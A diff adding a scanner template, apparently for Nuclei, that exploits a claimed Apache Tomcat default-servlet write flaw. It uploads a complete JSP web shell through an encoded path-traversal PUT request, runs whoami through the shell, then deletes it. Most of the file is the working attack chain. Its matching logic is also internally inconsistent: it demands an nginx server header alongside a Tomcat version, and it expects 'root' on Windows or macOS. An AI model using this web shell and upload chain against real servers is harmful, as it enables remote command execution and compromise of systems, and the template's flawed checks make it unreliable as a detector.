@@ -1,0 +1,108 @@
+id: tomcat-default-servlet-upload
+
+info:
+  name: Tomcat Default Servlet Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template exploits a vulnerability in certain versions of Apache Tomcat where the default servlet is misconfigured to allow write operations on a case-insensitive file system, such as Windows or macOS. The vulnerability allows uploading a JSP web shell to the server and validating execution.
+  tags: intrusive
+
+http:
+  # Step 1: Pre-check to confirm Tomcat server and detect default servlet misconfigurations
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: headers
+        regex:
+          - "server:.*nginx"
+      - type: regex
+        part: body
+        regex:
+          - "Apache Tomcat/(11\\.0\\.[01]|10\\.1\\.[0-9]{1,2}|9\\.0\\.[0-9]{1,2})"
+      - type: word
+        part: body
+        words:
+          - "Default Servlet"
+
+  # Step 2: Upload the malicious JSP shell
+  - raw:
+      - |
+        PUT /default~Servlet/.%2e/%c0%ae%c0%ae/%c0%ae/webapps/ROOT/shell.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        User-Agent: Mozilla/5.0
+
+        <%@ page import="java.io.*" %>
+        <html>
+        <body>
+        <% 
+            String cmd = request.getParameter("cmd"); 
+            Process p = Runtime.getRuntime().exec(cmd); 
+            OutputStream os = p.getOutputStream();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) { 
+                out.println(line + "<br>"); 
+            }
+        %>
+        </body>
+        </html>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+  # Step 3: Verify file upload
+  - raw:
+      - |
+        GET /shell.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers:
+      - type: word
+        words:
+          - "<%@ page import"
+
+  # Step 4: Execute uploaded shell to validate RCE
+  - raw:
+      - |
+        GET /shell.jsp?cmd=whoami HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root"  # Adjust based on expected output for successful command execution
+      - type: status
+        status:
+          - 200
+
+  # Step 5: Cleanup uploaded shell
+  - raw:
+      - |
+        DELETE /shell.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        X-Custom-Header: s1d6p01nt7@bugcrowdninja.com
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 404
